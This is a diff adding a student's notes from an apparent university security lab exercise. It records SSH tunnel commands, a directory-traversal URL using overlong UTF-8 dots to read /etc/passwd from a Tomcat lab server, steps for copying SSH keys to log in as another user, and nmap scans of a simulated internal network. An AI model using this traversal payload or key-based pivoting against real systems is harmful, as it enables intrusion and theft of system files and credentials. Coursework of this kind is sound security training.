@@ -1,0 +1,89 @@
+  Gratulation!
+
+Wenn Sie dieses E-Mail lesen koennen, haben Sie Ihren E-Mail Client korrekt konfiguriert und bereits die Zugangsdaten fuer die weitere Uebung erhalten.
+
+SSH-Zugangsdaten fuer die weitere Uebung:
+Server: sela.inso.tuwien.ac.at
+Port: 12345
+Benutzername: 0926240
+
+ssh -p 12345 -l 0926240 -L 2222:192.168.20.100:8000 sela.inso.tuwien.ac.at
+ssh -p 12345 -l 0926240 -L 2223:192.168.20.100:22 sela.inso.tuwien.ac.at
+
+http://securitytracker.com/id/1020665 -> 
+http://localhost:2222/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+ssh -i /home/simon/studium/sse/lab1/.ssh/ -p 2223 localhost
+
+cp alle_ssh_dateien /home/.ssh/
+
+ssh -p 2223 walter@localhost  
+
+
+-------
+b)
+ nmap 192.168.20.100/24
+
+
+Interesting ports on 192.168.20.100:
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+8009/tcp open  ajp13
+
+Interesting ports on 192.168.20.254:
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+873/tcp open  rsync
+
+
+walter@tomcat:~$ nmap 192.168.98.124/24
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-04 13:44 CEST
+All 1000 scanned ports on omega.local.vienna.essecorp.invalid (192.168.98.1) are closed
+
+Interesting ports on alpha.local.vienna.essecorp.invalid (192.168.98.10):
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Interesting ports on beta.local.vienna.essecorp.invalid (192.168.98.28):
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+25/tcp open  smtp
+
+Interesting ports on gamma.local.vienna.essecorp.invalid (192.168.98.54):
+Not shown: 999 closed ports
+PORT     STATE SERVICE
+1080/tcp open  socks
+
+Interesting ports on delta.local.vienna.essecorp.invalid (192.168.98.99):
+Not shown: 999 closed ports
+PORT    STATE SERVICE
+631/tcp open  ipp
+
+Interesting ports on tomcat.local.vienna.essecorp.invalid (192.168.98.124):
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+8009/tcp open  ajp13
+
+Interesting ports on epsilon.local.vienna.essecorp.invalid (192.168.98.201):
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+All 1000 scanned ports on zeta.local.vienna.essecorp.invalid (192.168.98.202) are closed
+
+Nmap done: 256 IP addresses (8 hosts up) scanned in 3.68 seconds
+
+traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
+ 1  omega.local.vienna.essecorp.invalid (192.168.98.1)  0.198 ms  0.175 ms  0.157 ms
+ *
+
+---------------------
+
